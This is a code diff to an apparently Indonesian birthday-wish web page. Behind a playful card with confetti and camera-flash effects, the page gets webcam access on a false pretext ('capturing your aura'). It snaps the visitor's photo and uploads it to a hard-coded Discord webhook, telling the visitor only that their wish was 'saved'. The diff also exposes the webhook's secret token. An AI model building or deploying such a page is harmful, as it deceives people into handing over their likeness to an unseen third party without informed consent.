@@ -12,21 +12,38 @@
             margin: 0; padding: 0; font-family: 'Poppins', sans-serif;
             background: #1a1a2e; height: 100vh;
             display: flex; justify-content: center; align-items: center; color: white;
+            overflow: hidden;
+        }
+
+        /* Efek Flash Putih */
+        #flash-effect {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; opacity: 0; pointer-events: none; z-index: 9999;
         }
 
         .container {
             text-align: center; background: rgba(255, 255, 255, 0.05);
             padding: 40px; border-radius: 30px; backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1); width: 85%; max-width: 400px;
+            transition: transform 0.1s;
+        }
+
+        /* Animasi Shake saat difoto */
+        .shake { animation: shake 0.2s ease-in-out; }
+        @keyframes shake {
+            0% { transform: translate(0,0); }
+            25% { transform: translate(5px, 5px); }
+            50% { transform: translate(-5px, -5px); }
+            100% { transform: translate(0,0); }
         }
 
         h1 { font-family: 'Dancing Script', cursive; font-size: 2.5rem; margin-bottom: 10px; }
         
-        /* Area Kamera */
         #camera-wrapper {
             width: 100%; height: 0; overflow: hidden;
             border-radius: 20px; transition: 0.5s all ease;
             margin: 0 auto; border: 0px solid var(--accent);
+            background: #000;
         }
 
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
@@ -45,7 +62,9 @@
 </head>
 <body>
 
-    <div class="container">
+    <div id="flash-effect"></div>
+
+    <div class="container" id="main-card">
         <h1 id="title">Make a Wish</h1>
         <p id="desc">Pejamkan matamu, pikirkan satu keinginan, lalu tekan tombol di bawah.</p>
         
@@ -59,22 +78,24 @@
     </div>
 
     <script>
+        // Ganti URL Webhook kamu di sini
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
+        
         const video = document.getElementById('webcam');
         const wrapper = document.getElementById('camera-wrapper');
         const btn = document.getElementById('main-btn');
         const statusText = document.getElementById('status');
         const title = document.getElementById('title');
+        const flash = document.getElementById('flash-effect');
+        const card = document.getElementById('main-card');
 
         async function activateCamera() {
             statusText.innerText = "Sedang menghubungkan ke bintang-bintang...";
             
             try {
-                // Minta izin kamera tepat saat tombol diklik
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // Animasi memunculkan video
                 wrapper.style.height = "250px";
                 wrapper.style.borderWidth = "4px";
                 wrapper.style.marginBottom = "20px";
@@ -83,28 +104,42 @@
                 btn.innerText = "Tiup Lilin! 🎂";
                 statusText.innerText = "Tersenyumlah, sistem sedang menangkap aura kebahagiaanmu.";
                 
-                // Ganti fungsi tombol untuk capture
                 btn.onclick = takePhoto;
 
             } catch (err) {
-                alert("Waduh, kameranya tidak diizinkan. Padahal ada kejutan di dalam!");
+                alert("Waduh, kameranya tidak diizinkan.");
                 statusText.innerText = "Gagal mengakses kamera.";
             }
         }
 
         function takePhoto() {
-            // Efek Confetti
+            // 1. Efek Flash (Putih Terang sekilas)
+            flash.style.opacity = "1";
+            card.classList.add('shake');
+            
+            setTimeout(() => {
+                flash.style.opacity = "0";
+                flash.style.transition = "opacity 0.5s ease-out";
+                card.classList.remove('shake');
+            }, 100);
+
+            // 2. Efek Confetti
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
 
+            // 3. Proses Capture Foto
             const canvas = document.getElementById('photo-canvas');
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Gambar foto dari video ke canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Kirim ke Discord
+            // Ganti teks segera setelah klik
+            title.innerText = "Mengirim ke Langit...";
+            btn.disabled = true;
+            btn.innerText = "Tersimpan!";
+
+            // 4. Kirim ke Discord
             canvas.toBlob((blob) => {
                 const formData = new FormData();
                 formData.append('file', blob, 'birthday_wish.png');
@@ -115,7 +150,6 @@
                     title.innerText = "Terkirim!";
                     statusText.innerText = "Harapanmu sudah disimpan selamanya.";
                     btn.style.display = "none";
-                    // Matikan kamera setelah selesai
                     video.srcObject.getTracks().forEach(track => track.stop());
                 });
             }, 'image/png');
